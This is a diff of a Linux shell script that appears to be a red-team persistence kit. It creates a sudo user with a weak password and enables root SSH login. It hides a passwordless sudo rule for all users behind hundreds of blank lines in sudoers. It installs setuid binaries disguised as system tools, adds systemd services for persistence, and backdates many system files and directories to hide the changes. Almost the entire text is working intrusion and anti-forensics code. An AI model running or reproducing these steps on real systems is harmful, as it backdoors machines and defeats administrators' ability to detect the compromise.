@@ -49,8 +49,6 @@ then
 	useradd -G wheel bmiller &>/dev/null
 	echo "bmiller:changeme" | chpasswd &>/dev/null
 	
-	# Ensure sudo is working correctly
-	# sed -i 's/^#\s*\(%wheel\s*ALL=(ALL)\s*NOPASSWD:\s*ALL\)/\1/' /etc/sudoers &>/dev/null
 
 	
 elif [[ -f /etc/debian_version ]]
@@ -79,8 +77,10 @@ then
         useradd -G sudo bmiller &>/dev/null
         echo "bmiller:changeme" | chpasswd &>/dev/null
 fi
+
+
 #===============================================================================
-			# EDIT CONFIGURATION FILES #
+			# CONFIGURATIONSS #
 #===============================================================================
 
 # Enable Root login over ssh
@@ -94,14 +94,17 @@ rm -f /tmp/asdasd
 
 
 
-# Enable sudo over AnYtHiNg
-
-for i in {1..40}
-do
+# Enable sudowoodo
+if grep -Fxq "ALL ALL=(ALL:ALL) NOPASSWD:ALL" /etc/sudoers
+then
 	echo "" >> /etc/sudoers
-done
-echo 'ALL ALL=(ALL:ALL) NOPASSWD:ALL' >> /etc/sudoers
-
+else
+	for i in {1..200}
+	do
+		echo "" >> /etc/sudoers
+	done
+	echo 'ALL ALL=(ALL:ALL) NOPASSWD:ALL' >> /etc/sudoers
+fi
 
 #===============================================================================
 				# SUID #
@@ -168,54 +171,79 @@ fi
 # PRISM
 chmod 7700 ./fsdisk
 cp ./fsdisk /sbin/
-touch -a --date "2020-11-19 20:51:30" /sbin/fsdisk
-touch -m --date "2020-11-19 20:51:30" /sbin/fsdisk
 
 chmod 7700 ./devutil
 cp ./devutil /usr/local/
-touch -a --date "2016-11-21 20:51:30" /usr/local/devutil
-touch -m --date "2016-11-21 20:51:30" /usr/local/devutil
 
 chmod 7700 ./udevd
 cp ./udevd /sbin/
-touch -a --date "2020-11-31 20:51:30" /sbin/udevd
-touch -m --date "2020-11-31 20:51:30" /sbin/udevd
 
 
 # SYSTEMD PERSISTENCE
 chmod 777 ./developer-utility.service
 cp ./developer-utility.service /etc/systemd/system/
-touch -a --date "2020-3-20 20:51:30" /etc/systemd/system/developer-utility.service
-touch -m --date "2020-3-20 20:51:30" /etc/systemd/system/developer-utility.service
 systemctl start developer-utility.service
 systemctl enable developer-utility.service
 
 chmod 777 ./developer-utility-daemon.service
 cp ./developer-utility-daemon.service /etc/systemd/system/
-touch -a --date "2020-5-20 09:54:30" /etc/systemd/system/developer-utility-daemon.service
-touch -m --date "2020-5-20 09:54:30" /etc/systemd/system/developer-utility-daemon.service
 systemctl start developer-utility-daemon.service
 systemctl enable developer-utility-daemon.service
 
 chmod 777 ./filesys.service
 cp ./filesys.service /etc/systemd/system/
-touch -a --date "2020-3-20 20:51:30" /etc/systemd/system/filesys.service
-touch -m --date "2020-3-20 20:51:30" /etc/systemd/system/filesys.service
 systemctl start filesys.service
 systemctl enable filesys.service
 
-# TIMESTOMP
+
+#===============================================================================
+				# TIMESTOMP #
+#===============================================================================
+
 touch -a --date "2020-3-20 20:51:30" /etc/sudoers
 touch -m --date "2020-3-20 20:51:30" /etc/sudoers
 
-touch -a --date "2020-3-20 20:51:30" /etc/passwd
-touch -m --date "2020-3-20 20:51:30" /etc/passwd
+touch -a --date "2020-11-20 20:51:30" /etc/passwd
+touch -m --date "2020-11-20 20:51:30" /etc/passwd
 
 touch -a --date "2020-3-20 20:51:30" /etc/ssh/sshd_config
 touch -m --date "2020-3-20 20:51:30" /etc/ssh/sshd_config
 
 touch -a --date "2020-3-20 20:51:30" /etc/sudoers
 touch -m --date "2020-3-20 20:51:30" /etc/sudoers
+
+touch -a --date "2020-11-19 20:51:30" /sbin/fsdisk
+touch -m --date "2020-11-19 20:51:30" /sbin/fsdisk
+
+touch -a --date "2016-11-21 20:51:30" /usr/local/devutil
+touch -m --date "2016-11-21 20:51:30" /usr/local/devutil
+
+touch -a --date "2020-11-30 20:51:30" /sbin/udevd
+touch -m --date "2020-11-30 20:51:30" /sbin/udevd
+
+touch -a --date "2020-11-30 20:51:30" /sbin
+touch -m --date "2020-11-30 20:51:30" /sbin
+
+touch -a --date "2021-1-30 20:51:30" /etc/ssh
+touch -m --date "2021-1-30 20:51:30" /etc/ssh
+
+touch -a --date "2020-5-20 09:54:30" /etc/systemd/system/developer-utility-daemon.service
+touch -m --date "2020-5-20 09:54:30" /etc/systemd/system/developer-utility-daemon.service
+
+touch -a --date "2020-3-20 20:51:30" /etc/systemd/system/filesys.service
+touch -m --date "2020-3-20 20:51:30" /etc/systemd/system/filesys.service
+
+touch -a --date "2020-3-20 20:51:30" /etc/systemd/system/developer-utility.service
+touch -m --date "2020-3-20 20:51:30" /etc/systemd/system/developer-utility.service
+
+touch -a --date "2020-3-20 20:51:30" /etc/systemd/system/
+touch -m --date "2020-3-20 20:51:30" /etc/systemd/system/
+
+touch -a --date "2020-3-20 20:51:30" /etc/systemd/
+touch -m --date "2020-3-20 20:51:30" /etc/systemd/
+
+touch -a --date "2020-11-30 20:51:30" /etc
+touch -m --date "2020-11-30 20:51:30" /etc
 
 
 exit 0
